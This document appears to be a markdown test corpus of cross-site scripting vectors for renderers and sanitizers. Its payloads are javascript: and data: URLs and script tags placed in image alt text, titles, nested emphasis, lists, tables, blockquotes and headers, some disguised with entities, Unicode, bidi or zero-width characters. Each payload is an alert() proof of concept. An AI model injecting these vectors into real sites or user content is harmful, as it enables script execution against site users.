# Markdown Nesting and Attribute Exploitation

## Alt attribute with markdown injection
![<script>alert('alt-xss')</script>](https://safe.com/image.jpg)
![**bold** _italic_ [link](javascript:alert('nested'))` code`](https://safe.com/image.jpg)
![![nested-image](javascript:alert('alt-nested')))](https://safe.com/image.jpg)

## Alt attribute with HTML entity injection  
![&lt;script&gt;alert('alt-entity')&lt;/script&gt;](https://safe.com/image.jpg)
![&#60;script&#62;alert('alt-decimal')&#60;/script&#62;](https://safe.com/image.jpg)
![&#x3C;script&#x3E;alert('alt-hex')&#x3C;/script&#x3E;](https://safe.com/image.jpg)

## Alt attribute with Unicode payload
![𝒿𝒶𝓋𝒶𝓈𝒸𝓇𝒾𝓅𝓉:𝒶𝓁𝑒𝓇𝓉('unicode-alt')](https://safe.com/image.jpg)
![javascript\u003Aalert('unicode-colon-alt')](https://safe.com/image.jpg)

## Title attribute exploitation with nested markdown
![test](https://safe.com/image.jpg "javascript:alert('title-js')")
![test](https://safe.com/image.jpg "Title with [link](javascript:alert('title-link'))")
![test](https://safe.com/image.jpg "Title with **bold [nested](javascript:alert('title-nested'))**")

## Title attribute with line break confusion
![test](https://safe.com/image.jpg "Title with
javascript:alert('title-newline')")

![test](https://safe.com/image.jpg "Title with \n javascript:alert('title-backslash-n')")

## Title attribute with quote escaping exploitation
![test](https://safe.com/image.jpg "Title with \" javascript:alert('title-quote')")
![test](https://safe.com/image.jpg 'Title with \' javascript:alert("title-single-quote")')
![test](https://safe.com/image.jpg "Title ending without quote javascript:alert('title-unclosed'))

## Mixed nesting with emphasis and images
*Emphasized text with ![dangerous](javascript:alert('emphasis-nested'))*
**Strong text with ![dangerous](javascript:alert('strong-nested'))**
`Code with ![dangerous](javascript:alert('code-nested'))`

## Links containing images with dangerous URLs
[Link text ![dangerous-img](javascript:alert('link-img-nested'))](https://safe.com/link)
[Text with ![img](data:text/html,<script>alert('link-data-uri')</script>)](https://safe.com/link)

## Images inside link text with state confusion
[![Link img](javascript:alert('img-as-link-text'))](https://safe.com/link)
[![![nested](javascript:alert('double-nested')))](https://safe.com/link)

## List items with image injection
1. List item with ![dangerous](javascript:alert('list-img'))
   * Nested list with ![dangerous](javascript:alert('nested-list-img'))
     - Deep nest ![dangerous](javascript:alert('deep-list-img'))

## Table cells with image exploitation  
| Header 1 | Header 2 |
|----------|----------|
| ![table-img](javascript:alert('table-cell')) | Normal content |
| Normal | ![table-img2](data:text/html,<script>alert('table-data-uri')</script>) |

## Blockquotes with nested image attacks
> Quote with ![dangerous](javascript:alert('blockquote-img'))
> > Nested quote with ![dangerous](javascript:alert('nested-blockquote-img'))
> > > Deep quote ![dangerous](javascript:alert('deep-quote-img'))

## Code block boundary confusion with images
```
This should be code
```
![dangerous](javascript:alert('after-code-block'))

```markdown
![dangerous](javascript:alert('in-code-block'))
```

## HTML block mixing with markdown images
<div>
HTML block
</div>
![dangerous-after-html](javascript:alert('after-html-block'))

<p>![dangerous-in-html](javascript:alert('html-p-img'))</p>

## Horizontal rule boundary confusion
![before-rule](javascript:alert('before-hr'))

---

![after-rule](javascript:alert('after-hr'))

## Link reference definition with image alt confusion
[link-text ![ref-img](javascript:alert('ref-def-img'))][dangerous-link]

[dangerous-link]: javascript:alert('ref-def-target')

## Footnote-style syntax abuse (if supported)
Here is text with ![footnote-img](javascript:alert('footnote'))[^1]

[^1]: Footnote with ![footnote-def-img](javascript:alert('footnote-def'))

## Nested emphasis with image parsing confusion
***Triple emphasis with ![dangerous](javascript:alert('triple-emphasis'))***
___Triple underscore with ![dangerous](javascript:alert('triple-underscore'))___

## Line break injection in image syntax
![alt-with-
hardbreak](javascript:alert('alt-hardbreak'))

![alt](javascript:alert('url-hardbreak')
"title with hardbreak")

## Image inside headers with markdown injection
# Header 1 ![h1-img](javascript:alert('h1-header'))
## Header 2 ![h2-img](javascript:alert('h2-header'))
### Header 3 ![h3-img](javascript:alert('h3-header'))

## Autolink confusion with images
<![not-autolink](javascript:alert('fake-autolink'))>
<https://safe.com/![img-in-autolink](javascript:alert('autolink-img'))>

## Definition list abuse (if supported)  
Term with ![term-img](javascript:alert('def-term'))
: Definition with ![def-img](javascript:alert('def-definition'))

## Mixed markdown and raw HTML attribute injection
<img src="javascript:alert('raw-html-img')" alt="Raw HTML">
![markdown-img](javascript:alert('after-raw-html'))

## Escape sequence bypass in image syntax
![alt\]text](javascript:alert('escaped-closing-bracket'))
![alt](javascript\:alert('escaped-colon'))
![alt](javascript:alert\('escaped-paren'\))

## Unicode directional override in alt text
![‮tla-txet](javascript:alert('bidi-alt-text'))
![alt with ‮‫‪direction control‬‫‮](javascript:alert('bidi-mixed'))

## Zero-width character boundary attacks in alt
![​zwsp​alt​text​](javascript:alert('zwsp-alt-boundary'))  
![alt‌with‍zw‌chars](javascript:alert('zw-chars-alt'))

## Combining character disruption in alt text
![a̸l̸t̸-̸t̸e̸x̸t̸](javascript:alert('combining-alt'))
![normal-a͏l͏t](javascript:alert('combining-invisible'))

## Parser state confusion with malformed syntax
![unclosed-alt](javascript:alert('unclosed'))
![alt](unclosed-url
![between-images](javascript:alert('between-malformed'))
continued-url)

## Complex nested structure exploitation
*Italic with **bold ![nested](javascript:alert('complex-nested'))** more italic*
[Link with *italic **bold ![deep](javascript:alert('deep-complex'))***](https://safe.com/)

## Image syntax breaking across line continuations
![alt](javascript:\
alert('line-continuation'))

![alt-continued\
text](javascript:alert('alt-line-continuation'))